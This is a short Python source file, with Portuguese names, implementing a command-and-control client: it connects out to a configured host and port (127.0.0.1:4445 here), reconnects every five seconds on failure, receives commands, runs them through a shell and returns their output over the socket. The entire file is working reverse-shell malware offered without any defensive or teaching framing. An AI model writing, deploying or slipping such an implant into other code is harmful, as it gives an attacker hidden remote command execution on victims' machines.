import socket
import subprocess
import time


class C2Client:
    def __init__(self, host, porta):
        self.host = host
        self.porta = porta
        self.conexao = None

    def conectar(self):
        while True:
            try:
                self.conexao = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.conexao.connect((self.host, self.porta))
                print(f"Conectado em {self.host}:{self.porta}")
                self.escuta_por_comandos()
            except (socket.error, ConnectionRefusedError) as e:
                print(f"Falha na conexão: {e}. Tentando novamente em 5 segundos...")
                time.sleep(5)

    def executar_comando(self, comando):
        funcao, _, argumentos = comando.partition(" ")
        try:
            funcao = getattr(self, f'comando_{funcao}')
            if funcao and argumentos:
                retorno = funcao(argumentos)
            elif funcao and not argumentos:
                retorno = funcao("")
            if retorno:
                return True
        except AttributeError:
            print(f"Nenhum comando chamado '{funcao}' foi encontrado.")
        

    def escuta_por_comandos(self):
        while True:
            try:
                dados = self.receber_dados().decode()
                self.executar_comando(dados)
            except Exception as e:
                print(f"Erro: {e}")
                break

    def comando_shell(self, comando):
        try:
            saida = subprocess.check_output(comando, shell=True, stderr=subprocess.PIPE, timeout=4)
            print(saida)
            if saida != b"":
                self.enviar_dados(saida)
            else:
                self.enviar_dados("OK")
        except Exception as e:
            self.enviar_dados(f"Erro no shell: {e}")
            print(f"Erro no shell: {e}")
    
    def enviar_dados(self, buffer):
        if not isinstance(buffer, bytes):
            buffer = buffer.encode()
        try:
            self.conexao.sendall(buffer)
            return True
        except:
            return False
            
    def receber_dados(self):
        dados = self.conexao.recv(1024)
        if not dados:
            raise ConnectionError("Conexão encerrada durante a recepção")
        return dados
    
if __name__ == "__main__":
    host = "127.0.0.1"
    porta = 4445
    client = C2Client(host, porta)
    client.conectar()
